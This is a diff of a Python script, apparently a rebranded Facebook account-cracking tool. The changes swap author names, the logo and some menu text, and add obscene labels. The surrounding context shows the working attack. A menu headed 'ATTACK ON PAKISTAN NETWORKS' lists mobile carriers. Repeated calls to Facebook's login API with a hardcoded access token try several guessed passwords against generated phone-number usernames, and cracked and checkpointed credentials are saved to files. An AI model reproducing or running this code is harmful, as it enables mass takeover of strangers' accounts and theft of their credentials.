@@ -52,16 +52,16 @@ def t():
     time.sleep(1)
 def cb():
     os.system('clear')
-##### Dev : Kashmiri hacker#####
+##### Dev : SCYCO-CHUZZA#####
 ##### LOGO #####
 logo='''
-\x1b[1;96m░██═╝░🆂🅷🅰🅳🅾🆆 🅷🅰🅲🅺🅴🆁
+\x1b[1;96m░██【A】【T】【I】【F】 【Z】【A】【H】【O】【O】【R】
 \x1b[1;93m--------------------------------------------------------------
 \x1b[1;92m➣  YouTube  : MR.HACKER
-\x1b[1;91m➣  Facebook : Kashmiri hacker
-\x1b[1;93m➣  Note     : CYBER KING 4.2.0
+\x1b[1;91m➣  Facebook : Hater fucker
+\x1b[1;93m➣  Note     : fuck fb system \ chuzza not a name its brand
 \x1b[1;95m➣  Warning  : IF NOT WORK THAN USE FREE VPN\work na kry VPN use kren
-\x1b[1;96m➣  Whatsapp : +923402721462
+\x1b[1;96m➣  Whatsapp : Syco-brand no WhatsApp
 \x1b[1;97m➣  Note     : ANY KIND PROBLEM MSG ME.
 \x1b[1;94m➣  Disclamiar :AWAY FROM ILLIGAL WAY.
 \x1b[1;93m--------------------------------------------------------------"""
@@ -78,8 +78,8 @@ def menu():
 	print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
 	print
         print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
-	print "\033[1;92m[1]  MOBILINK |black-hat|"
-	print "\033[1;92m[2]  TELINOR  |cyber king|"
+	print "\033[1;92m[1]  MOBILINK |fighter|"
+	print "\033[1;92m[2]  TELINOR  |haters fucker|"
 	print "\033[1;92m[3]  WARID    |101.1.0.55.1|"
 	print "\033[1;92m[4]  UFONE    |VPN CONNECTED|"
 	print "\033[1;92m[5]  ZONG     |saman.naizi|"
@@ -218,14 +218,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;91shadow-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1																				
+				print '\x1b[1;91chuzza-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;92mshadow-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
+					print '\x1b[1;92mchuzza-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -235,14 +235,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;91mshadow-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
+		                        	print '\x1b[1;91mchuzza-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;92mshadow-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
+							print '\x1b[1;92mchuzza-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -252,14 +252,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;91mshadow-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+								print '\x1b[1;91mchuzza-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;92mshadow-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+									print '\x1b[1;92mchuzza-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
@@ -269,14 +269,14 @@ def action():
 									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                                q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;91mshadow-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+										print '\x1b[1;91mchuzza-OK\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
 										okb = open('save/successfull.txt', 'a')
 										okb.write(k+c+user+'|'+pass4+'\n')
 										okb.close()
 										oks.append(c+user+pass4)
 									else:
 										if 'www.facebook.com' in q['error_msg']:
-											print '\x1b[1;92mshadow-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+											print '\x1b[1;92mchuzza-CP🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
 											cps = open('save/checkpoint.txt', 'a')
 											cps.write(k+c+user+'|'+pass4+'\n')
 											cps.close()
